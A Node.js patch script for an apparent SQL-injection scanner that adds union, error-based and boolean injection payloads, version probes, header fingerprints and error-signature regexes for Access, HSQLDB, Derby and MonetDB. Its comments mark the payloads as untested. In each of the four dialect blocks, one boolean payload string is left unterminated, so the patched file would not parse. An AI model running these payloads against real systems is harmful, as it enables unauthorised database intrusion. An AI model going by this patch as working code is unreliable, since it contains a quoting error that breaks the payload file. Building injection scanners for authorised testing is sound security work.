// Add Access, HSQLDB, Derby, MonetDB (D-direction) to payloads.js
import { readFileSync, writeFileSync } from 'fs';
import { execSync } from 'child_process';

const path = 'D:/projects/sqli-scanner/server/src/engine/payloads.js';
let src = readFileSync(path, 'utf8');

function replaceExact(oldText, newText) {
  const oldCRLF = oldText.replace(/\n/g, '\r\n');
  const oldLF = oldText.replace(/\r\n/g, '\n');
  if (src.includes(oldCRLF)) {
    src = src.replace(oldCRLF, newText.replace(/\n/g, '\r\n'));
    return true;
  }
  if (src.includes(oldLF)) {
    src = src.replace(oldLF, newText.replace(/\n/g, '\r\n'));
    return true;
  }
  return false;
}

// ========================================================================
// 1. Add D-direction PAYLOADS after H2 (before `// OOB 带外`)
// ========================================================================
const oldH2End = `  time: [],
  stacked: [],
};

  // OOB 带外触发语句（技术名 'oob'，无回显盲注兜底）`;

const newD = `  time: [],
  stacked: [],
};

  // —— D 方向新增（最小适配：union/error/boolean 基础；time/stacked 均不支持）——
  // 方言 payload 未经真实环境验证，标注待验证。
  // Access（Jet SQL）：Using MSysObjects as pseudo-table
  // 注意：Access 无原生 version() 函数，用常量串 'ACCESS' 回显标识
  // 注意：Access 不支持 error-based 注入，error 留空
  // 注意：Access 无原生 SLEEP 函数，time 留空
  // 注意：Access 不支持堆叠查询，stacked 留空
  // HSQLDB（HyperSQL）：Using (VALUES(0)) t as pseudo-table
  // Derby（Apache Derby）：Using SYSIBM.SYSDUMMY1 as pseudo-table
  // MonetDB（Column-store）：Using sys.version as pseudo-table
PAYLOADS.Access = {
  union: [
    "{ORIG} UNION SELECT {NUM},1,1 FROM MSysObjects-- -",
    "{ORIG}' UNION SELECT {NUM},1,1 FROM MSysObjects-- -",
    '{ORIG}" UNION SELECT {NUM},1,1 FROM MSysObjects-- -',
  ],
  error: [],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2",
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};
PAYLOADS.HSQLDB = {
  union: [
    "{ORIG} UNION SELECT {NUM},'HSQLDB' FROM (VALUES(0)) t-- -",
    "{ORIG}' UNION SELECT {NUM},'HSQLDB' FROM (VALUES(0)) t-- -",
    '{ORIG}" UNION SELECT {NUM},\'HSQLDB\' FROM (VALUES(0)) t-- -',
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a' FROM (VALUES(0)) t) AS INTEGER)-- -",
    '{ORIG}" AND 1=CAST((SELECT \'a\' FROM (VALUES(0)) t) AS INTEGER)-- -',
    "{ORIG}' AND hsqldb_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2",
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};
PAYLOADS.Derby = {
  union: [
    "{ORIG} UNION SELECT {NUM},'DERBY' FROM SYSIBM.SYSDUMMY1-- -",
    "{ORIG}' UNION SELECT {NUM},'DERBY' FROM SYSIBM.SYSDUMMY1-- -",
    '{ORIG}" UNION SELECT {NUM},\'DERBY\' FROM SYSIBM.SYSDUMMY1-- -',
  ],
  error: [],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2",
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};
PAYLOADS.MonetDB = {
  union: [
    "{ORIG} UNION SELECT {NUM},(SELECT sys_version FROM sys.version) FROM sys.version-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT sys_version FROM sys.version) FROM sys.version-- -",
    '{ORIG}" UNION SELECT {NUM},(SELECT sys_version FROM sys.version) FROM sys.version-- -',
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a' FROM sys.version) AS INTEGER)-- -",
    '{ORIG}" AND 1=CAST((SELECT \'a\' FROM sys.version) AS INTEGER)-- -',
    "{ORIG}' AND monetdb_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2",
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};

  // OOB 带外触发语句（技术名 'oob'，无回显盲注兜底）`;

if (!replaceExact(oldH2End, newD)) { console.log('ERROR: H2 end anchor not found'); process.exit(1); }
console.log('✓ Added PAYLOADS.Access/HSQLDB/Derby/MonetDB');

// ========================================================================
// 2. Add to DBMS_LIST
// ========================================================================
const oldList = "export const DBMS_LIST = ['MySQL', 'PostgreSQL', 'SQL Server', 'SQLite', 'Oracle', 'MariaDB', 'TiDB', 'DM8', 'ClickHouse', 'DB2', 'Sybase', 'Firebird', 'Informix', 'H2'];";
const newList = "export const DBMS_LIST = ['MySQL', 'PostgreSQL', 'SQL Server', 'SQLite', 'Oracle', 'MariaDB', 'TiDB', 'DM8', 'ClickHouse', 'DB2', 'Sybase', 'Firebird', 'Informix', 'H2', 'Access', 'HSQLDB', 'Derby', 'MonetDB'];";
if (!replaceExact(oldList, newList)) { console.log('ERROR: DBMS_LIST not found'); process.exit(1); }
console.log('✓ DBMS_LIST updated');

// ========================================================================
// 3. Add DB_VERSION entries (after H2)
// NOTE: Use String.raw to preserve backslash-d in regex literals
// ========================================================================
const oldDBVer = String.raw`  // H2：version() 返回 "1.4.200" 等纯数字串
  H2: { func: 'version()', sig: /^\d+\.\d+/ },
};`;

const newDBVer = String.raw`  // H2：version() 返回 "1.4.200" 等纯数字串
  H2: { func: 'version()', sig: /^\d+\.\d+/ },
  // —— D 方向新增（最小适配，待真实环境验证）——
  // Access：无 version() 原生函数，用常量串 'ACCESS' 回显标识
  Access: { func: "'ACCESS'", sig: /ACCESS/i },
  // HSQLDB：用常量串 'HSQLDB' 回显标识
  HSQLDB: { func: "'HSQLDB'", sig: /HSQLDB/i },
  // Derby：用常量串 'DERBY' 回显标识
  Derby: { func: "'DERBY'", sig: /DERBY/i },
  // MonetDB：用 sys.version 视图回显版本号
  MonetDB: { func: '(SELECT sys_version FROM sys.version)', sig: /^\d+\.\d+/ },
};`;

if (!replaceExact(oldDBVer, newDBVer)) { console.log('ERROR: DB_VERSION end not found'); process.exit(1); }
console.log('✓ DB_VERSION updated');

// ========================================================================
// 4. Add FINGERPRINT entries (after H2)
// ========================================================================
const oldFp = "  H2: [{ header: 'Server', match: /h2/i }, { header: 'X-Powered-By', match: /h2/i }],\n};";
const newFp = "  H2: [{ header: 'Server', match: /h2/i }, { header: 'X-Powered-By', match: /h2/i }],\n  // —— D 方向新增（最小适配，响应头特征，待真实环境验证）——\n  Access: [{ header: 'X-Powered-By', match: /asp/i }],\n  HSQLDB: [{ header: 'Server', match: /hsqldb/i }],\n  Derby: [{ header: 'Server', match: /(derby|java)/i }],\n  MonetDB: [{ header: 'Server', match: /monetdb/i }],\n};";
if (!replaceExact(oldFp, newFp)) { console.log('ERROR: FINGERPRINT end not found'); process.exit(1); }
console.log('✓ FINGERPRINT updated');

// ========================================================================
// 5. Add SUPPORTED entries (after H2)
// ========================================================================
const oldSup = "  H2: { union: true, error: true, boolean: true, time: false, oob: false, second_order: true },\n};";
const newSup = "  H2: { union: true, error: true, boolean: true, time: false, oob: false, second_order: true },\n  // —— D 方向新增（最小适配，待真实环境验证）——\n  Access: { union: true, error: false, boolean: true, time: false, oob: false, second_order: true },\n  HSQLDB: { union: true, error: true, boolean: true, time: false, oob: false, second_order: true },\n  Derby: { union: true, error: false, boolean: true, time: false, oob: false, second_order: true },\n  MonetDB: { union: true, error: true, boolean: true, time: false, oob: false, second_order: true },\n};";
if (!replaceExact(oldSup, newSup)) { console.log('ERROR: SUPPORTED end not found'); process.exit(1); }
console.log('✓ SUPPORTED updated');

// ========================================================================
// 6. Add ERROR_SIG_BY_DBMS entries (after H2)
// ========================================================================
const oldErrSig = "  { dbms: 'ClickHouse', sig: /(DB::Exception|ClickHouse)/i },\n];";
const newErrSig = "  { dbms: 'ClickHouse', sig: /(DB::Exception|ClickHouse)/i },\n  { dbms: 'Access', sig: /(Microsoft Access|ODBC|Jet.*Database|Could not find file)/i },\n  { dbms: 'HSQLDB', sig: /(HSQLDB|org\\.hsqldb)/i },\n  { dbms: 'Derby', sig: /(Derby|org\\.apache\\.derby)/i },\n  { dbms: 'MonetDB', sig: /(MonetDB|monetdb|mclient)/i },\n];";
if (!replaceExact(oldErrSig, newErrSig)) { console.log('ERROR: ERROR_SIG_BY_DBMS end not found'); process.exit(1); }
console.log('✓ ERROR_SIG_BY_DBMS updated');

// ========================================================================
// 7. Add ERROR_SIG keywords
// ========================================================================
const oldErrSigRegex = "/(SQL syntax|mysql_fetch|ORA-\\d{5}|Microsoft SQL Server|PostgreSQL.*ERROR|SQLite3|syntax error|Unclosed quotation|extractvalue|updatexml|conversion failed|unknown column|Division by zero|SQL\\d{4}[NRT]|DB2 SQL Error|SQLSTATE|Adaptive Server|Sybase|SQL error code|Firebird|isc_|Informix|H2|JDBC|Cannot parse)/i";
const newErrSigRegex = "/(SQL syntax|mysql_fetch|ORA-\\d{5}|Microsoft SQL Server|PostgreSQL.*ERROR|SQLite3|syntax error|Unclosed quotation|extractvalue|updatexml|conversion failed|unknown column|Division by zero|SQL\\d{4}[NRT]|DB2 SQL Error|SQLSTATE|Adaptive Server|Sybase|SQL error code|Firebird|isc_|Informix|H2|JDBC|Cannot parse|Microsoft Access|ODBC|Jet.*Database|HSQLDB|org\\.hsqldb|Derby|org\\.apache\\.derby|MonetDB|monetdb)/i";
if (!replaceExact(oldErrSigRegex, newErrSigRegex)) { console.log('ERROR: ERROR_SIG regex not found'); process.exit(1); }
console.log('✓ ERROR_SIG regex updated');

// ========================================================================
// Write & verify
// ========================================================================
writeFileSync(path, src, 'utf8');
try {
  execSync(`node -c "${path}"`, { encoding: 'utf8', stdio: 'pipe' });
  console.log('✅ Syntax verification passed!');
} catch (e) {
  console.log('ERROR: Syntax error');
  process.exit(1);
}